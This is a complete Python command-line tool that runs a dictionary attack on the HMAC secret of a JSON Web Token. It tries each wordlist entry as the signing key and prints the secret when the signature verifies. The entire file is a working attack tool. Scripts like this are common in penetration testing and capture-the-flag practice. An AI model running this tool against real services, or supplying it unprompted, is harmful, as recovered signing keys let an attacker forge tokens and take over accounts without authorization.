#!/usr/bin/env python3

from jwt import decode, InvalidTokenError, DecodeError, get_unverified_header
import sys
from tqdm import tqdm


def is_jwt(jwt):
    parts = jwt.split(".")
    return len(parts) == 3


def read_jwt(jwt):
    if not is_jwt(jwt):
        with open(jwt, "r", encoding="utf-8", errors="ignore") as fp:
            jwt = fp.read().strip()

    if not is_jwt(jwt):
        raise RuntimeError(f"Parameter {jwt} is not a valid JWT")

    return jwt


def crack_jwt(jwt, dictionary):
    header = get_unverified_header(jwt)

    # FIX: read dictionary in latin-1 and ignore errors
    with open(dictionary, "r", encoding="latin-1", errors="ignore") as fp:
        for secret in tqdm(fp):
            secret = secret.rstrip()

            try:
                decode(jwt, secret, algorithms=[header["alg"]])
                return secret
            except DecodeError:
                # Signature verification failed
                continue
            except InvalidTokenError:
                # Signature correct but payload invalid: still good
                return secret


def signature_is_supported(jwt):
    header = get_unverified_header(jwt)
    return header["alg"] in ["HS256", "HS384", "HS512"]


def main(argv):
    if len(argv) != 3:
        print(f"Usage: {argv[0]} [JWT or JWT filename] [dictionary filename]")
        return

    jwt = read_jwt(argv[1])
    if not signature_is_supported(jwt):
        print("Error: This JWT does not use a supported signing algorithm")
        return

    print(f"Cracking JWT {jwt}")
    result = crack_jwt(jwt, argv[2])
    if result:
        print("="*40)
        print("Found secret key:", result)
        print("="*40)
    else:
        print("Key not found")


if __name__ == "__main__":
    main(sys.argv)
